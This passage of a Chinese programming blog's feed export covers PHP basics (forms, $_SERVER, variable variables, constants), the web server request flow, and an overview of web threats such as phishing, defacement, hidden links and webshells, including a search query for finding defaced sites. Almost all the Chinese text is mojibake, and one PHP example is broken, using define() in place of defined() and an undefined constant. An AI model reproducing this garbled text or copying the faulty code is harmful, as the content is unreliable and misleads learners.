ä¸­åœ°å€é‡Œçš„ ? åçš„æ•°æ®æ˜¯getæ•°æ®</span><br><span class="line">form è¡¨å•ä¸­çš„å„ä¸ªè¡¨å•é¡¹,å°±æ˜¯postæ•°æ®! --&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num1&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n1;?&gt;&#x27;</span>&gt;&lt;!--æ•°å­—<span class="number">1</span> --&gt;</span><br><span class="line">+</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num2&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n2;?&gt;&#x27;</span>&gt;&lt;!-- æ•°å­—<span class="number">2</span> !--&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&#x27;=&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $sum;?&gt;&#x27;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="server-å˜é‡">$_SERVER å˜é‡</h3><p>å®ƒä»£è¡¨ä»»ä½•ä¸€æ¬¡è¯·æ±‚ä¸­ï¼Œå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ç«¯çš„ä¸€äº›â€œåŸºæœ¬ä¿¡æ¯â€æˆ–ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬å¾ˆå¤šï¼ˆ10å¤šé¡¹ï¼‰ã€‚</p><p>$_SERVER['xxx'] è¿™é‡Œçš„ xxx ä¸å…¶ä½™å‡ ä¸ªé¢„å®šä¹‰å˜é‡çš„ xxx ä¸åŒ,è¿™é‡Œæ˜¯å›ºå®šçš„ 10 æ¥ä¸ª,å¯ä»¥é€šè¿‡æŸ¥æ–‡æ¡£æŸ¥åˆ°å®ƒä»¬éƒ½æ˜¯æ„æ€.</p><p>æˆ‘ä»¬æ— éå°±æ˜¯è¦çŸ¥é“ï¼Œå“ªäº›ä¿¡æ¯æ˜¯å¯ä»¥ä¾›æˆ‘ä»¬ä½¿ç”¨çš„ï¼</p><p>å¸¸ç”¨çš„æœ‰ï¼š</p><p>PHP_SELFï¼š è¡¨ç¤ºå½“å‰è¯·æ±‚çš„ç½‘é¡µåœ°å€ï¼ˆä¸å«åŸŸåéƒ¨åˆ†ï¼‰</p><p>SERVER_NAMEï¼š è¡¨ç¤ºå½“å‰è¯·æ±‚çš„æœåŠ¡å™¨å</p><p><strong>SERVER_ADDR</strong>ï¼š è¡¨ç¤ºå½“å‰è¯·æ±‚çš„æœåŠ¡å™¨ IP åœ°å€</p><p>DOCUMENT_ROOTï¼š è¡¨ç¤ºå½“å‰è¯·æ±‚çš„ç½‘ç«™ç‰©ç†è·¯å¾„ï¼ˆapacheè®¾ç½®ç«™ç‚¹æ—¶é‚£ä¸ªï¼‰</p><p><strong>REMOTE_ADDR</strong>ï¼š è¡¨ç¤ºå½“å‰è¯·æ±‚çš„å®¢æˆ·ç«¯çš„ IP åœ°å€</p><p>SCRIPT_NAMEï¼š è¡¨ç¤ºå½“å‰ç½‘é¡µåœ°å€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; ä½ çš„ IP ä¸º: &quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure><p>åœ¨ä½ çš„ç½‘é¡µçš„ php ä»£ç å—ä¸­,æ’å…¥è¿™æ ·ä¸€å¥,å°±å¯ä»¥æ˜¾ç¤ºå½“å‰è¯·æ±‚é¡µé¢çš„å®¢æˆ·ç«¯çš„ IP.</p><h2 id="å¯å˜å˜é‡">å¯å˜å˜é‡</h2><p>å˜é‡åæœ¬èº«åˆæ˜¯ä¸€ä¸ª"å˜é‡"çš„å˜é‡.</p><p>ç¤ºä¾‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$v1</span>;<span class="comment">//è¾“å‡º10</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;v1&quot;</span>;<span class="comment">//è¿™æ˜¯ä¸€ä¸ªåä¸ºstrçš„å˜é‡,å…¶å€¼ä¸º &quot;v1&quot; (å­—ç¬¦ä¸²)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$str</span>;<span class="comment">//$str = v1,, $($str) = $v1 = 10</span></span><br></pre></td></tr></table></figure><p>åº”ç”¨åœºæ™¯:</p><ol type="1"><li><p>è·å–æ–‡ä»¶åç¼€åå, ä¸ç¡®å®šæ–‡ä»¶åç¼€å, æ¯”å¦‚:å›¾ç‰‡ jpg, png, bmp ,å†™å¯å˜å‡½æ•°å.(å’Œ C++ ä¸­çš„é‡è½½æœ‰äº›ç›¸ä¼¼,æ ¹æ®å®é™…å˜é‡é€‰æ‹©å‡½æ•°)</p></li><li><p>å¾ªç¯éå†ä¸€äº›åç¼€æ•°å­—ä¸åŒçš„å˜é‡,æ¯”å¦‚: v1, v2, v3,è®¾ç½®å¾ªç¯å˜é‡$i,ç„¶åæ‹¼æ¥å˜é‡: <span class="math inline">\(s = &quot;v&quot;.\)</span>i;</p></li></ol><h1 id="å¸¸é‡">å¸¸é‡</h1><h2 id="å¸¸é‡çš„ä¸¤ç§å®šä¹‰å½¢å¼">å¸¸é‡çš„ä¸¤ç§å®šä¹‰å½¢å¼</h2><h3 id="define-å‡½æ•°å½¢å¼">define() å‡½æ•°å½¢å¼</h3><p>define("å¸¸é‡å", å¯¹åº”å¸¸é‡å€¼);</p><p>å¸¸é‡åæ¨èä½¿ç”¨å…¨å¤§å†™</p><h3 id="const-å…³é”®å­—å®šä¹‰">const å…³é”®å­—å®šä¹‰</h3><p>const å¸¸é‡å = å¯¹åº”å¸¸é‡å€¼;</p><p>ä¾‹: const PI = 3.14; const PI = 1 + 2.14;</p><h2 id="å¸¸é‡çš„ä¸¤ç§å–å€¼å½¢å¼">å¸¸é‡çš„ä¸¤ç§å–å€¼å½¢å¼</h2><h3 id="ç›´æ¥ä½¿ç”¨">ç›´æ¥ä½¿ç”¨</h3><p>echo å¸¸é‡å;<strong>å¸¸é‡åœ¨ç›´æ¥ä½¿ç”¨æ—¶,ä¸ç”¨å†åå­—å‰åŠ $ç¬¦å·,ç›´æ¥ç”¨å°±è¡Œ</strong></p><h3 id="ä½¿ç”¨-constantå‡½æ•°ä»¥å–å€¼">ä½¿ç”¨ constant()å‡½æ•°ä»¥å–å€¼</h3><p>echo constant("å¸¸é‡å");</p><h2 id="å¸¸é‡ä¸å˜é‡çš„åŒºåˆ«">å¸¸é‡ä¸å˜é‡çš„åŒºåˆ«</h2><ol type="1"><li><p>å˜é‡çš„æ•°æ®å¯ä»¥å˜åŒ–ï¼ˆé‡æ–°èµ‹å€¼ï¼‰ï¼Œå¸¸é‡ä¸å¯ä»¥ã€‚</p></li><li><p>å˜é‡å¯ä»¥å­˜å‚¨å„ç§æ•°æ®ç±»å‹ï¼Œè€Œå¸¸é‡åªèƒ½å­˜å‚¨ç®€å•æ•°æ®ç±»å‹ã€‚</p></li></ol><h2 id="åˆ¤æ–­ä¸€ä¸ªå¸¸é‡æ˜¯å¦å­˜åœ¨-defined">åˆ¤æ–­ä¸€ä¸ªå¸¸é‡æ˜¯å¦å­˜åœ¨:defined()</h2><p>åˆ¤æ–­çš„ç»“æœè¿”å›ï¼štrueï¼ˆè¡¨ç¤ºå­˜åœ¨ï¼‰æˆ– falseï¼ˆè¡¨ç¤ºä¸å­˜åœ¨ï¼‰</p><p>å½¢å¼ï¼š ifï¼ˆ defined (â€˜å¸¸é‡åâ€™) ) { //å¦‚æœè¯¥å¸¸é‡åå­˜åœ¨ï¼Œåˆ™....//....åšä»€ä¹ˆäº‹æƒ…ã€‚ã€‚ã€‚ã€‚ }</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¦‚æœå¸¸é‡æœªå®šä¹‰è¿‡,é‚£ä¹ˆå®šä¹‰ä¸€ä¸‹,å¦‚æœå®šä¹‰è¿‡,å°±ä¸å†å®šä¹‰,ç›´æ¥ä½¿ç”¨.</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">define</span>(<span class="string">&#x27;PI2&#x27;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PI2&#x27;</span>,<span class="number">3.1415</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s2</span> = PI * <span class="number">3</span> * <span class="number">3</span>;</span><br></pre></td></tr></table></figure><h2 id="é¢„å®šä¹‰å¸¸é‡ç”¨å¾—æ¯”è¾ƒå°‘">é¢„å®šä¹‰å¸¸é‡(ç”¨å¾—æ¯”è¾ƒå°‘ )</h2><p>é¢„å®šä¹‰å¸¸é‡å°±æ˜¯ PHP è¯­è¨€å†…éƒ¨é¢„å…ˆå®šä¹‰å¥½çš„å¸¸é‡ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><p>æ¯”å¦‚ï¼šPHP_VERSION, PHP_OS, PHP_INT_MAX, M_PI ç­‰ã€‚ PHP_VERSIONï¼šè¡¨ç¤ºå½“å‰ php çš„ç‰ˆæœ¬ä¿¡æ¯ PHP_OSï¼š è¡¨ç¤ºå½“å‰ php è¿è¡Œæ‰€åœ¨çš„ç³»ç»Ÿä¿¡æ¯PHP_INT_MAXï¼š è¡¨ç¤ºå½“å‰ç‰ˆæœ¬çš„ php ä¸­çš„æœ€å¤§çš„æ•´æ•°å€¼ M_PIï¼š è¡¨ç¤ºåœ†å‘¨ç‡Ï€ï¼ˆä¸€ä¸ªæœ‰ 10 å¤šä½å°æ•°çš„æ•°ï¼‰</p><p>ä½¿ç”¨: (å¸¸é‡ä¸ç”¨$)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> M_PI;</span><br></pre></td></tr></table></figure><h2 id="é­”æœ¯å¸¸é‡-magic-constantsç”¨å¾—æ¯”è¾ƒå¤š">é­”æœ¯å¸¸é‡ MagicConstants(ç”¨å¾—æ¯”è¾ƒå¤š)</h2><p>é­”æœ¯å¸¸é‡ä¹Ÿæ˜¯å¸¸é‡ï¼Œåªæ˜¯åœ¨å½¢å¼ä¸Šä¸ºå¸¸é‡ï¼Œè€Œå…¶å€¼å…¶å®æ˜¯â€œå˜åŒ–â€çš„ã€‚</p><p>ä»–ä»¬ä¹Ÿæ˜¯ç³»ç»Ÿä¸­é¢„å…ˆå®šä¹‰å¥½çš„ï¼Œä¹Ÿå°±å‡ ä¸ªï¼Œä¸‹é¢æ˜¯æœ€å¸¸ç”¨çš„ 3 ä¸ªï¼š __DIR__ï¼šä»£è¡¨å½“å‰ php ç½‘é¡µæ–‡ä»¶æ‰€åœ¨çš„ç›®å½• __FILE__ ï¼šä»£è¡¨å½“å‰ phpç½‘é¡µæ–‡ä»¶æœ¬èº«çš„è·¯å¾„ __LINE__ ï¼šä»£è¡¨å½“å‰è¿™ä¸ªå¸¸é‡æ‰€åœ¨çš„è¡Œå·</p><p>å¯ä»¥åŠ¨æ€è·å–ä¿¡æ¯</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/magic_constants.png" /></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§å®‰å…¨é—®é¢˜</title>
      <link href="/blog/2019/07/22/websec/common_security_problem/"/>
      <url>/blog/2019/07/22/websec/common_security_problem/</url>
      
        <content type="html"><![CDATA[<h2 id="é’“é±¼phishing">é’“é±¼(phishing)</h2><p>ç™¾åº¦ç™¾ç§‘ï¼š</p><blockquote><p>ç½‘ç»œé’“é±¼ï¼ˆPhishingï¼Œä¸é’“é±¼çš„è‹±è¯­ fishingå‘éŸ³ç›¸è¿‘ï¼Œåˆåé’“é±¼æ³•æˆ–é’“é±¼å¼æ”»å‡»ï¼‰æ˜¯é€šè¿‡å¤§é‡å‘é€å£°ç§°æ¥è‡ªäºé“¶è¡Œæˆ–å…¶ä»–çŸ¥åæœºæ„çš„æ¬ºéª—æ€§åƒåœ¾é‚®ä»¶ï¼Œæ„å›¾å¼•è¯±æ”¶ä¿¡äººç»™å‡ºæ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç”¨æˆ·åã€å£ä»¤ã€å¸å·ID ã€ ATM PIN ç æˆ–ä¿¡ç”¨å¡è¯¦ç»†ä¿¡æ¯ï¼‰çš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚</p></blockquote><p>å¸¸è§ç‰¹å¾ï¼šè¯±æƒ‘æ€§æ ‡é¢˜ï¼Œä»¿å†’çœŸå®ç½‘ç«™ï¼Œéª—å–ç”¨æˆ·è´¦å·ï¼Œéª—å–ç”¨æˆ·èµ„æ–™</p><h2 id="ç½‘é¡µç¯¡æ”¹web-tamper">ç½‘é¡µç¯¡æ”¹(web tamper)</h2><p>å…¥ä¾µç½‘ç«™ä¹‹åå¯¹ç½‘é¡µè¿›è¡Œç¯¡æ”¹ï¼Œä¸»è¦æœ‰ç‚«è€€æŠ€æœ¯ã€è¾¾åˆ°æŸç§æ”¿æ²»ç›®çš„ç­‰ã€‚</p><p>ï¼ˆå¥½ç©çš„æ¥å•¦ï¼‰è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Google Hackingè¯­æ³•æ¥å‘æ˜ä¸€äº›è¢«ç¯¡æ”¹çš„ç½‘é¡µï¼Œåœ¨æŸåº¦ï¼ˆè¿™é‡Œä¸å¤ªå»ºè®®ä½¿ç”¨Googleï¼Œå®è·µä¸­æ„Ÿè§‰ç™¾åº¦æœç€è¿™ç©æ„æ¯”è¾ƒæœ‰æ•ˆï¼‰æœç´¢ï¼šintitle:hackedbyï¼Œç„¶åå°±èƒ½æ‰¾åˆ°ä¸€äº›è¢«ç¯¡æ”¹çš„ç½‘ç«™ã€‚</p><p>å…³äºä½¿ç”¨æœç´¢å¼•æ“çš„å°æŠ€å·§ï¼š</p><p>å…³é”®å­—ï¼šHacked byï¼Œlogin</p><p>Google Hacking è¯­æ³•ç®€ä»‹ï¼ˆè¿˜ä¼šåœ¨å¼€ä¸€ç¯‡åšæ–‡ä¸“é—¨è®²ï¼‰ï¼š</p><p>intitle:keyword æ ‡é¢˜ä¸­å«æœ‰å…³é”®å­—çš„ç½‘é¡µ</p><p>intext:keyword æ­£æ–‡ä¸­å«æœ‰å…³é”®å­—çš„ç½‘é¡µ</p><p>site:domain åœ¨æŸåŸŸåå’Œå­åŸŸåä¸‹çš„ç½‘é¡µ</p><h3 id="æš—é“¾hidden-hyperlinks">æš—é“¾(Hidden hyperlinks)</h3><p>æš—é“¾æ˜¯ç½‘é¡µç¯¡æ”¹çš„ä¸€ç§ï¼Œé€šå¸¸æ˜¯é»‘å®¢åˆ©ç”¨ç½‘ç«™å®‰å…¨æ¼æ´å…¥ä¾µç½‘ç«™åç•™ä¸‹çš„ä¸€äº›åœ¨ç½‘é¡µé¡µé¢ä¸Šä¸å¯è§çš„è¶…é“¾æ¥ï¼Œè¿™äº›è¶…é“¾æ¥ç”¨äºæ¬ºéª—æœç´¢å¼•æ“æé«˜æ‰€é“¾å‘çš„ç½‘ç«™æ’åï¼Œä¸€èˆ¬æƒ…å†µä¸‹æš—é“¾ä¸»è¦åµŒå…¥åœ¨ç½‘ç«™é¦–é¡µã€‚</p><p>ä½¿ç”¨æŸ¥çœ‹ç½‘é¡µæºä»£ç åŠŸèƒ½ï¼Œå¯ä»¥çœ‹åˆ°æš—é“¾çš„é“¾æ¥ã€‚</p><p>ç‰¹å¾ï¼š</p><ol type="1"><li>éšè—åœ¨ç½‘ç«™å½“ä¸­é“¾æ¥</li><li>æš—é“¾ä¸èƒ½ä¸ºæ­£å¸¸ç”¨æˆ·ç‚¹å‡»ï¼ˆæš—é“¾ä¸æ˜¯ä¸ºäººå‡†å¤‡çš„ï¼Œæ˜¯ä¸ºæœç´¢å¼•æ“çš„çˆ¬è™«æœºå™¨äººå‡†å¤‡çš„ï¼‰</li><li>æš—é“¾å¸¸ä¸ºï¼šç½‘æ¸¸/åŒ»ç–—/è èœ/è‰²æƒ…</li></ol><p>ä¸‹é¢ä»‹ç»ä¸€ä¸‹é»‘å®¢æ”»å‡»ä¸­çš„æˆ˜æ–—æœºï¼šWebshell</p><p>é¡¾åæ€ä¹‰ï¼Œ"web" - æ˜¾ç„¶éœ€è¦æœåŠ¡å™¨å¼€æ”¾ web æœåŠ¡ï¼›"shell" -å–å¾—å¯¹æœåŠ¡å™¨æŸç§ç¨‹åº¦ä¸Šæ“ä½œæƒé™ã€‚</p><p>webshell å¸¸å¸¸è¢«ç§°ä¸ºåŒ¿åç”¨æˆ·(å…¥ä¾µè€…)é€šè¿‡ WEB æœåŠ¡ç«¯å£å¯¹ WEBæœåŠ¡å™¨æœ‰æŸç§ç¨‹åº¦ä¸Šæ“ä½œçš„æƒé™,ç”±äºå…¶å¤§å¤šæ˜¯ä»¥ç½‘é¡µè„šæœ¬çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºç½‘ç«™åé—¨å·¥å…·ã€‚</p><p>ç®€å•çš„è¯´ web shell å°±æ˜¯ç­‰äºåˆ«äººç½‘ç«™çš„æ“ä½œæƒé™ï¼Œä½ æœ‰å“ªä¸ªç½‘ç«™çš„ shellå°±æ˜¯æœ‰å“ªä¸ªç½‘ç«™çš„æ“ä½œæƒé™ï¼Œä½ å¯ä»¥åœ¨ä»–ç½‘ç«™æŒ‚ä½ ä»¬ç½‘ç«™çš„å•å‘é“¾æ¥ï¼Œä¹Ÿå¯ä»¥ç”¨ä»–ä»¬ç½‘ç«™é¦–é¡µåšç°è‰²è¯ï¼Œç”šè‡³å¯ä»¥åœ¨ä»–ä»¬ç½‘ç«™æ–°å¢ç›®å½•åšç°è‰²è¯çš„æ’åã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šäººåœ¨æ”¶web shell çš„åŸå› ï¼Œå¤§å¤šæ•°éƒ½æ˜¯ç”¨æ¥åšç°è‰²è¡Œä¸šï¼Œæ•ˆæœå¿«ï¼Œæ¥é’±å¿«ã€‚</p><p>WebShell é€šå¸¸æ˜¯ä»¥ aspã€phpã€jspã€asa æˆ–è€… cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„â€”ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºâ€”ç§ç½‘é¡µåé—¨ã€‚é»‘å®¢åœ¨å…¥ä¾µç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†WebShell åé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨ WEBç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨â€”èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®è¿™äº›åé—¨ï¼Œå¾—åˆ°å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æˆ–è€…WEBç³»ç»ŸæœåŠ¡å™¨çš„ç›®çš„ã€‚è¿™æ ·å°±å¯ä»¥ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ã€æŸ¥çœ‹æ•°æ®åº“ã€æ‰§è¡Œä»»æ„ç¨‹åºå‘½ä»¤ç­‰ã€‚</p><p>æ ¹æ®åŠŸèƒ½ä¹Ÿåˆ†ä¸ºå¤§é©¬ä¸å°é©¬ã€‚å¤§é©¬çš„åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œä¸€èˆ¬æœ‰è´¦å·ï¼Œç›®å½•ï¼Œç»„ä»¶ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œæ³¨å†Œè¡¨ç­‰ã€‚å°é©¬é€šå¸¸æŒ‡çš„ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æ³¨å…¥è¿‡ç¨‹ï¼šé»‘å®¢é€šè¿‡æ¼æ´ææƒï¼Œä¸Šä¼  webshell ä½œä¸ºä¸€ä¸ªåé—¨ã€‚</p><p>æ€»ä¹‹ï¼Œéƒ½æ˜¯ web å®‰å…¨ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/web_sec.png" /></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯†PHP</title>
      <link href="/blog/2019/07/21/programming/php/php_intro/"/>
      <url>/blog/2019/07/21/programming/php/php_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢„å¤‡çŸ¥è¯†">é¢„å¤‡çŸ¥è¯†</h1><h2 id="åŠ¨æ€ä¸é™æ€é¡µé¢">åŠ¨æ€ä¸é™æ€é¡µé¢</h2><p>åœ¨ä»‹ç» php ä¹‹å‰ï¼Œæœ‰å¿…è¦äº†è§£ä¸€ä¸‹é™æ€é¡µé¢ä¸åŠ¨æ€é¡µé¢çš„åŒºåˆ«ï¼š</p><p><ahref="https://www.jianshu.com/p/649d2a0ebde5">é™æ€ç½‘é¡µä¸åŠ¨æ€ç½‘é¡µçš„åŒºåˆ«</a>ï¼Œ<ahref="http://xbhong.top/2018/02/15/static/">é™æ€ç½‘é¡µä¸åŠ¨æ€ç½‘é¡µçš„ç†è§£</a></p><p>å…¶ä¸­ï¼ŒåŠ¨æ€ç½‘é¡µï¼š</p><ol type="1"><li>ä¼šå› ä¸ºæµè§ˆæ—¶é—´æˆ–ä¸åŒçš„äººè€Œå‘ˆç°ä¸åŒçš„å†…å®¹ã€‚ï¼ˆæ¯”å¦‚ï¼šè®¢å•è¯¦æƒ…ï¼‰</li><li>åå°ç¨‹åºçš„è¿è¡Œç»“æœï¼ˆåŠ¨æ€ç¨‹åºï¼‰ï¼Œæœ€ç»ˆç›®çš„ï¼Œæ˜¯ä¸ºäº†â€œè¾“å‡ºâ€å‰å°çš„é™æ€é¡µé¢ã€‚</li></ol><h2 id="ç½‘ç«™è®¿é—®æµç¨‹æµè§ˆå™¨ç«¯è¿‡ç¨‹">ç½‘ç«™è®¿é—®æµç¨‹(æµè§ˆå™¨ç«¯è¿‡ç¨‹)</h2><p>ä»æµè§ˆå™¨è¾“å…¥ä¸€ä¸ªç½‘å€ï¼Œåˆ°æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªç½‘é¡µå±•ç¤ºå‡ºæ¥ï¼Œå…¶ä¸­çš„è¿‡ç¨‹å¤§è‡´ä¸ºï¼š</p><ol type="1"><li><p>å…ˆåœ¨æœ¬æœºçš„ hosts æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾åŸŸåæ‰€å¯¹åº”çš„ IPï¼›</p></li><li><p>å¦‚æ‰¾åˆ°ï¼Œåˆ™æ ¹æ®è¯¥ IPå°±å¯ä»¥æ‰¾åˆ°å¹¶è®¿é—®è¯¥æœåŠ¡å™¨äº†ï¼ŒæœåŠ¡å™¨è¿”å›ç›¸åº”ç½‘é¡µä¿¡æ¯ï¼Œè®¿é—®ç»“æŸï¼›</p></li><li><p>å¦‚æ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™åˆ°äº’è”ç½‘ä¸Šçš„ DNS æœåŠ¡å™¨ä¸­ï¼ŒæŸ¥æ‰¾åŸŸåæ‰€å¯¹åº”çš„IPï¼›</p></li><li><p>å¦‚æœæ‰¾åˆ°ï¼Œåˆ™æ ¹æ®è¯¥ IPå°±å¯ä»¥æ‰¾åˆ°å¹¶è®¿é—®è¯¥æœåŠ¡å™¨äº†ï¼ŒæœåŠ¡å™¨è¿”å›ç›¸åº”ç½‘é¡µä¿¡æ¯ï¼Œè®¿é—®ç»“æŸï¼›</p></li><li><p>å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™æµè§ˆå™¨ä¼šæœ‰ç±»ä¼¼â€œæ— æ³•æ‰¾åˆ°æœåŠ¡å™¨â€çš„æŠ¥é”™æç¤ºï¼Œè®¿é—®ç»“æŸã€‚</p></li></ol><h2 id="web-æœåŠ¡ç«¯å‘å±•å†ç¨‹">web æœåŠ¡ç«¯å‘å±•å†ç¨‹</h2><h3 id="web-çš„é™æ€é¡µé¢æ—¶æœŸ">WEB çš„é™æ€é¡µé¢æ—¶æœŸ</h3><ol type="1"><li>æµè§ˆå™¨æ ¹æ® URL å‘ web é¡µé¢å‘é€è¯·æ±‚ï¼ŒWEBæœåŠ¡ç«¯ä¼šå»ç›¸åº”çš„æœåŠ¡å™¨æ‰¾åˆ°å¯¹åº”çš„ html æ–‡ä»¶ã€‚</li><li>æœåŠ¡å™¨å°†è¯¥ html çš„å†…å®¹å‘é€ç»™æµè§ˆå™¨ç«¯</li><li>æµè§ˆå™¨ç«¯æ¥æ”¶ HTML é€šè¿‡æ¸²æŸ“å¼•æ“è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶æ˜¾ç¤ºé¡µé¢</li></ol><h3 id="web-çš„åŠ¨æ€é¡µé¢æ—¶æœŸ">WEB çš„åŠ¨æ€é¡µé¢æ—¶æœŸ</h3><p>åŠ¨æ€é¡µé¢ç”±è„šæœ¬é©±åŠ¨çš„ï¼ˆphp æ˜¯è„šæœ¬è¯­è¨€ï¼‰ã€‚è„šæœ¬è¯­è¨€æ–‡ä»¶ï¼ˆå¦‚ï¼šphpæ–‡ä»¶ï¼‰ç”±æœåŠ¡ç«¯çš„å¯¹åº”çš„è¯­è¨€è§£é‡Šå™¨è§£é‡Šä¸º HTML æ–‡ä»¶ï¼Œç„¶åå‘é€åˆ° WEBæœåŠ¡ç«¯è¿›è€Œå‘é€åˆ°æµè§ˆå™¨æ¸²æŸ“æ˜¾ç¤ºã€‚ä½†æ˜¯æ˜¾ç¤ºåˆ°æµè§ˆå™¨ä¸Šæ—¶ï¼Œå®ƒçš„åç¼€ä¸æ˜¯HTMLï¼Œè€Œæ˜¯å¯¹åº”è„šæœ¬è¯­è¨€çš„åç§°ï¼ˆå¦‚ï¼š.phpï¼‰</p><p>å½“æˆ‘ä»¬å»ºç«‹ä¸€äº›æ•°æ®åºå¤§çš„ç½‘ç«™æ—¶ï¼Œä¾¿éœ€è¦æ•°æ®åº“æœåŠ¡ã€‚æä¾› WEBç½‘ç«™çš„æ•°æ®æ”¯æŒã€‚æµè§ˆå™¨å‘é€è¯·æ±‚ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚ï¼Œå®šä½æ–‡ä»¶ï¼Œè„šæœ¬è¯­è¨€åˆ°è¾¾è§£é‡Šå™¨ï¼Œè¿›è¡Œè§£é‡Šï¼Œæ ¹æ®è„šæœ¬æ–‡ä»¶ä¸­è°ƒç”¨æ•°æ®åº“çš„å‘½ä»¤/å†…å®¹ï¼Œå‘æ•°æ®åº“è°ƒå–æˆ–æ“ä½œæ•°æ®ï¼Œè€Œåæ•°æ®åº“è¿”å›ç›¸åº”çš„æ•°æ®ã€‚è¿™äº›æ•°æ®é€šè¿‡è¯­è¨€è§£é‡Šå™¨ï¼Œå†ç»„è£…æˆHTML å†…å®¹ï¼Œæœ€åå‘é€ç»™æµè§ˆå™¨ï¼Œæ¸²æŸ“æ˜¾ç¤ºã€‚</p><p>æ•°æ®åº“ï¼Œweb æœåŠ¡å™¨ï¼Œè¯­è¨€è§£é‡Šå™¨ è¿™ä¸‰ä¸ªæ¨¡å—æ„æˆç°åœ¨ webæœåŠ¡ç«¯çš„æ¶æ„ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/struct.png" /></p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/struct_detail.png" /></p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¯­è¨€è§£é‡Šå™¨å’Œ webæœåŠ¡å™¨ä½äºåŒä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œä¸¤è€…ä½¿ç”¨é…ç½®æ–‡ä»¶è¿›è¡Œè¿æ¥ï¼ˆApacheé…ç½®æ–‡ä»¶ç­‰..ï¼‰ã€‚è„šæœ¬æ–‡ä»¶ä¹Ÿæ˜¯é€šè¿‡é…ç½®æ–‡ä»¶è¿æ¥åˆ°æ•°æ®åº“æœåŠ¡çš„ï¼ˆPHPè§£æå™¨é…ç½®ï¼ŒPHP 